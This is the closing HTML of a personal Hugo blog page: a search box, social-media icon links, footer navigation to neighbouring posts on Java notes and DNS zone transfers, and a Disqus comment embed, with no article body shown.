placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search><ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400"></ul></div></ul><div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col max-h-16"><a href=https://space.bilibili.com/1651059195 target=_blank class="bilibili icon pl-1 text-eucalyptus-400 hover:text-java-400" title="bilibili link" rel=noopener aria-label="follow on bilibili——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M7.172 2.757 10.414 6h3.171l3.243-3.242a1 1 0 011.415 1.415L16.414 6H18.5A3.5 3.5.0 0122 9.5v8A3.5 3.5.0 0118.5 21h-13A3.5 3.5.0 012 17.5v-8A3.5 3.5.0 015.5 6h2.085L5.757 4.171a1 1 0 011.415-1.415zM18.5 8h-13A1.5 1.5.0 004.007 9.356L4 9.5v8a1.5 1.5.0 001.356 1.493L5.5 19h13a1.5 1.5.0 001.493-1.356L20 17.5v-8A1.5 1.5.0 0018.5 8zM8 11a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1zm8 0a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1z"/></g></svg></div></a><a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg></div></a><a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg></div></a><a href='TW9uJTIwMTglMjBGZWJydWFyeSUyMDE5ODAlMjAyMTowMjo1NSUyMFVUQw==' target=_blank class="netease-cloud-music icon pl-1 text-eucalyptus-400 hover:text-java-400" title="netease-cloud-music link" rel=noopener aria-label="follow on netease-cloud-music——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M10.421 11.375c-.294 1.028.012 2.064.784 2.653 1.061.81 2.565.3 2.874-.995.08-.337.103-.722.027-1.056-.23-1.001-.52-1.988-.792-2.996-1.33.154-2.543 1.172-2.893 2.394zm5.548-.287c.273 1.012.285 2.017-.127 3-1.128 2.69-4.721 3.14-6.573.826-1.302-1.627-1.28-3.961.06-5.734.78-1.032 1.804-1.707 3.048-2.054l.379-.104c-.084-.415-.188-.816-.243-1.224-.176-1.317.512-2.503 1.744-3.04 1.226-.535 2.708-.216 3.53.76.406.479.395 1.08-.025 1.464-.412.377-.996.346-1.435-.09-.247-.246-.51-.44-.877-.436-.525.006-.987.418-.945.937.037.468.173.93.3 1.386.022.078.216.135.338.153 1.334.197 2.504.731 3.472 1.676 2.558 2.493 2.861 6.531.672 9.44-1.529 2.032-3.61 3.168-6.127 3.409-4.621.44-8.664-2.53-9.7-7.058C2.515 10.255 4.84 5.831 8.795 4.25c.586-.234 1.143-.031 1.371.498.232.537-.019 1.086-.61 1.35-2.368 1.06-3.817 2.855-4.215 5.424-.533 3.433 1.656 6.776 5 7.72 2.723.77 5.658-.166 7.308-2.33 1.586-2.08 1.4-5.099-.427-6.873a3.979 3.979.0 00-1.823-1.013c.198.716.389 1.388.57 2.062z"/></g></svg></div></a><a href=2517834528 target=_blank class="qq icon pl-1 text-eucalyptus-400 hover:text-java-400" title="qq link" rel=noopener aria-label="follow on qq——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M17.535 12.514l-.696-1.796c0-.021.01-.375.01-.558C16.848 7.088 15.446 4 12 4s-4.848 3.088-4.848 6.16c0 .183.009.537.01.558l-.696 1.796c-.19.515-.38 1.05-.517 1.51-.657 2.189-.444 3.095-.282 3.115.348.043 1.354-1.648 1.354-1.648.0.98.488 2.258 1.542 3.18-.394.127-.878.32-1.188.557-.28.214-.245.431-.194.52.22.385 3.79.245 4.82.125 1.03.12 4.599.26 4.82-.126.05-.088.085-.305-.194-.519-.311-.237-.795-.43-1.19-.556 1.055-.923 1.542-2.202 1.542-3.181.0.0 1.007 1.691 1.355 1.648.162-.02.378-.928-.283-3.116-.14-.463-.325-.994-.516-1.509zm1.021 8.227c-.373.652-.833.892-1.438 1.057-.24.065-.498.108-.794.138-.44.045-.986.065-1.613.064a33.23 33.23.0 01-2.71-.116c-.692.065-1.785.114-2.71.116a16.07 16.07.0 01-1.614-.064 4.928 4.928.0 01-.793-.138c-.605-.164-1.065-.405-1.44-1.059a2.274 2.274.0 01-.239-1.652c-.592-.132-1.001-.483-1.279-.911a2.43 2.43.0 01-.309-.71 4.028 4.028.0 01-.116-1.106c.013-.785.187-1.762.532-2.912.14-.466.327-1.008.568-1.655l.553-1.43a15.496 15.496.0 01-.002-.203C5.152 5.605 7.588 2 12 2c4.413.0 6.848 3.605 6.848 8.16l-.001.203.553 1.43.01.026c.225.606.413 1.153.556 1.626.348 1.15.522 2.129.535 2.916.007.407-.03.776-.118 1.108-.066.246-.161.48-.31.708-.276.427-.684.776-1.277.91.13.554.055 1.14-.24 1.654z"/></g></svg></div></a><a href='Vmlja3lja3lreQ==' target=_blank class="wechat icon pl-1 text-eucalyptus-400 hover:text-java-400" title="wechat link" rel=noopener aria-label="follow on wechat——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill-rule="evenodd"><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M10 14.676v-.062c0-2.508 2.016-4.618 4.753-5.233C14.389 7.079 11.959 5.2 8.9 5.2 5.58 5.2 3 7.413 3 9.98c0 .969.36 1.9 1.04 2.698.032.038.083.094.152.165a3.568 3.568.0 011.002 2.238 3.612 3.612.0 012.363-.442c.166.026.302.046.405.06A7.254 7.254.0 0010 14.675zm.457 1.951a9.209 9.209.0 01-2.753.055 19.056 19.056.0 01-.454-.067 1.612 1.612.0 00-1.08.212l-1.904 1.148a.806.806.0 01-.49.117.791.791.0 01-.729-.851l.15-1.781a1.565 1.565.0 00-.439-1.223 5.537 5.537.0 01-.241-.262C1.563 12.855 1 11.473 1 9.979 1 6.235 4.537 3.2 8.9 3.2c4.06.0 7.403 2.627 7.85 6.008 3.372.153 6.05 2.515 6.05 5.406.0 1.193-.456 2.296-1.229 3.19-.051.06-.116.13-.195.21a1.24 1.24.0 00-.356.976l.121 1.423a.635.635.0 01-.59.68.66.66.0 01-.397-.094l-1.543-.917a1.322 1.322.0 00-.874-.169c-.147.023-.27.04-.368.053-.316.04-.64.062-.969.062-2.694.0-4.998-1.408-5.943-3.401zm6.977 1.31a3.325 3.325.0 011.676.174 3.25 3.25.0 01.841-1.502c.05-.05.087-.09.106-.112.489-.565.743-1.213.743-1.883.0-1.804-1.903-3.414-4.4-3.414-2.497.0-4.4 1.61-4.4 3.414s1.903 3.414 4.4 3.414c.241.0.48-.016.714-.046.08-.01.188-.025.32-.046z"/></g></svg></div></a><a href=https://weibo.com/u/3337203335203336203332203334203333203334203331203331203332 target=_blank class="weibo icon pl-1 text-eucalyptus-400 hover:text-java-400" title="weibo link" rel=noopener aria-label="follow on weibo——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M20.194 14.197c0 3.362-4.53 6.424-9.926 6.424C5.318 20.62 1 18.189 1 14.534c0-1.947 1.18-4.087 3.24-6.088 2.832-2.746 6.229-4.033 7.858-2.448.498.482.723 1.122.719 1.858 1.975-.576 3.65-.404 4.483.752.449.623.532 1.38.326 2.207 1.511.61 2.568 1.77 2.568 3.382zm-4.44-2.07c-.386-.41-.4-.92-.198-1.41.208-.508.213-.812.12-.94-.264-.368-1.533-.363-3.194.311a2.043 2.043.0 01-.509.14c-.344.046-.671.001-.983-.265-.419-.359-.474-.855-.322-1.316.215-.67.18-1.076.037-1.215-.186-.18-.777-.191-1.659.143-1.069.405-2.298 1.224-3.414 2.306C3.925 11.54 3 13.218 3 14.534c0 2.242 3.276 4.087 7.268 4.087 4.42.0 7.926-2.37 7.926-4.424.0-.738-.637-1.339-1.673-1.652-.394-.113-.536-.171-.767-.417zm7.054-1.617a1 1 0 01-1.936-.502 4 4 0 00-4.693-4.924 1 1 0 11-.407-1.958 6 6 0 017.036 7.384z"/></g></svg></div></a><a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window"><div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg></div></a></div><div class="text-sm text-gray-500 leading-tight a-gray"><br>Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 9179 words in this page.</div></div></div></aside><footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2"><hr class=double-line><div class="flex flex-wrap justify-between pb-2 leading-loose font-serif"><a class=flex-grow-0 href=/2022/05/04/java-study-notes-04/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>Java学习笔记Ⅳ</a>
<a class=flex-grow-0 href=/2022/05/06/dns-zone-transfer-study-note/>DNS域传送漏洞学习<svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z"/></svg></a></div><div></div><hr><div class=pb-2><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//amiaaaz.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><hr></footer><script src=/dist/app.js></script>
<script src=/lib/fuse.min.js></script>
<script src=/lib/fastsearch.js></script></div></body></html>